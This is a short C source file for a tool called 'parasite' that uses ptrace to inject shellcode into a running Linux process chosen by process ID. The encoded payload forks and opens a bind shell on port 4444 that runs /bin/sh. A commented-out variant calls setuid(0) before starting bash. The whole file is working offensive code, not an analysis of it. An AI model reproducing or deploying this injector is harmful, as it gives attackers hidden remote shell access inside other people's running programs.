/*
 *  parasite -- parasite.c
 *  (C) 2012 jtRIPper
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

#include "../include/includes.h"
#include "../include/ptrace.h"
#include "../include/helper.h"
#include "../include/inject.h"

int hit = 0;

char stub[] = { "\x6a\x39\x58\x0f\x05\x48\x31\xff\x48\x39\xf8\x74\x0c\x6a\x3e\x58\x48\x89\xf7\x6a\x0c\x5e\x0f\x05\xc3" };
char shellcode[] = { "\x90\x90\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05" };
//char shellcode[] = { "\x48\x31\xff\x6a\x69\x58\x0f\x05\x57\x57\x5e\x5a\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x62\x61\x73\x50\x54\x5f\x6a\x3b\x58\x0f\x05" };

void ret_handler(int sig) {
  hit = 1;
}

void usage(char *argv0) {
  printf("Usage: %s <process id>\n", argv0);
}

void parseopts(int argc, char *argv[]) {
  if (argc > 1)
    return;
  usage(argv[0]);
  exit(0);
}

int main(int argc, char *argv[]) {
  char shell[strlen(stub) + strlen(shellcode) + 1];
  sprintf(shell, "%s%s", stub, shellcode);

  parseopts(argc, argv);
  int pid = atoi(argv[1]);

  attach(pid);
  struct user_regs_struct *tmp = inject(pid, shell);
  
  struct sigaction hook_ret;
  memset(&hook_ret, 0, sizeof(struct sigaction));
  hook_ret.sa_handler = ret_handler;
  sigaction(0xc, &hook_ret, 0);

  cont(pid);

  while(hit == 0) {}

  set_regs(pid, tmp);

  detach(pid);
  return 0;
}
